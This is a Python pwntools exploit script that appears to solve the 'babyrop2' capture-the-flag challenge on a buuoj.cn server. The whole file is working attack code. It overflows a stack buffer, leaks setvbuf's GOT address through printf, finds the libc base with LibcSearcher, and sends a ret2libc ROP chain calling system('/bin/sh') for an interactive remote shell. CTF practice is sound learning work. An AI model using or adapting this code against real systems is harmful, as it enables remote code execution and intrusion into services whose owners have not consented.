#!/usr/bin/python
# -*- coding: UTF-8 -*-

from pwn import *
from LibcSearcher import *

local = 0
os_level = 64
binary_name = 'babyrop2'
remote_addr, port = 'node5.buuoj.cn:25528'.split(':')

if local:
    p = process('./' + binary_name)
    elf = ELF('./' + binary_name)
    # libc = e.libc
else:
    p = remote(remote_addr, port)
    elf = ELF('./' + binary_name)
    # libc = ELF(libc-2.23.so')

if os_level == 64:
    context(log_level='debug', os='linux', arch='amd64', bits=64)
elif os_level == 32:
    context(log_level='debug', os='linux', arch='i386', bits=32)
else:
    print('Error os!!!')
    exit()
context.terminal = ['/usr/bin/x-terminal-emulator', '-e']

ru = lambda x: p.recvuntil(x)
rc = lambda x: p.recv(x)
rl = lambda: p.recvline()
sl = lambda x: p.sendline(x)
sd = lambda x: p.send(x)
sda = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
show = lambda x:log.success(x)
slp = lambda x:sleep(x)


#Main function
if __name__ == '__main__':
    #you can add your code here
    setvbuf_got = elf.got['setvbuf']
    printf_plt = elf.plt['printf']
    main = elf.symbols['main']
    ret = 0x00000000004004d1
    prdi = 0x0000000000400733
    #gdb.attach(p)
    payload = b'a'*0x20 + b'b'*0x8 + p64(prdi) + p64(setvbuf_got) + p64(printf_plt) + p64(main)
    sda('name?',payload)
    ru('!\n')
    setvbuf_addr = u64(rc(6).ljust(8, b'\x00'))
    show('setvbuf_addr--> ' + hex(setvbuf_addr))
    libc = LibcSearcher('setvbuf', setvbuf_addr)
    libc_base = setvbuf_addr - libc.dump('setvbuf')
    system_addr = libc_base + libc.dump('system')
    bin_sh_addr = libc_base + libc.dump('str_bin_sh')
    payload = b'a'*0x20 + b'b'*0x8 + p64(ret) + p64(prdi) + p64(bin_sh_addr) + p64(system_addr)
    sda('name?',payload)
    p.interactive()
